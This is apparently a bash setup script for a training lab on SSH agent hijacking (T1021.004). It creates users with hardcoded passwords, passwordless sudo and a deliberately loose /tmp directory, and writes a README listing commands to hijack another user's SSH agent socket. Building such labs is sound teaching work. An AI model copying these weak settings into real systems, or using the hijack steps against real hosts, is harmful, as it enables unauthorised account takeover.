#!/bin/bash
set -euo pipefail
PLAYER="player"; PASS="Player@123"
FLAG="HACKTIFY{SSH_AGENT_HIJACK_$(hostname|sha256sum|cut -c1-8)}"
id "$PLAYER" &>/dev/null || { useradd -m -s /bin/bash "$PLAYER"; echo "$PLAYER:$PASS"|chpasswd; }
echo "$PLAYER ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/player-lm7; chmod 440 /etc/sudoers.d/player-lm7
# Create admin user who has an SSH agent running
ADMIN="jump_admin"; APWD="JumpAdmin@2024"
id "$ADMIN" &>/dev/null || { useradd -m -s /bin/bash "$ADMIN"; echo "$ADMIN:$APWD"|chpasswd; }
mkdir -p /home/$ADMIN/.ssh && chmod 700 /home/$ADMIN/.ssh
ssh-keygen -t ed25519 -f /home/$ADMIN/.ssh/id_ed25519 -N "" -q 2>/dev/null
cat /home/$ADMIN/.ssh/id_ed25519.pub >> /home/$ADMIN/.ssh/authorized_keys
chmod 600 /home/$ADMIN/.ssh/authorized_keys
chown -R $ADMIN:$ADMIN /home/$ADMIN/.ssh
mkdir -p /root/.flags && chmod 700 /root/.flags
echo "$FLAG" > /root/.flags/flag.txt && chmod 644 /root/.flags/flag.txt
# Set SSH_AUTH_SOCK world-readable (misconfiguration — enables hijacking)
mkdir -p /tmp/ssh-agent-test && chmod 1777 /tmp/ssh-agent-test
cat > /home/$PLAYER/README.txt << 'RMEOF'
=== T1021.004 SSH Agent Hijacking ===
Login  : player / Player@123
Scenario: "jump_admin" has an SSH agent running with keys loaded.
          The SSH_AUTH_SOCK socket is accessible due to a misconfiguration.
Goal   : 1. Find running SSH agent sockets: find /tmp -name "agent.*" -readable
         2. Identify the jump_admin agent socket
         3. Hijack by setting SSH_AUTH_SOCK to point to their socket
         4. SSH as jump_admin without their password
Steps  : sudo find /tmp /run -name "agent.*" 2>/dev/null
         export SSH_AUTH_SOCK=/tmp/ssh-XXXXX/agent.YYYY
         ssh-add -l  (list keys in hijacked agent)
         ssh jump_admin@localhost
RMEOF
chown $PLAYER:$PLAYER /home/$PLAYER/README.txt
echo "[+] T1021.004-C setup complete."
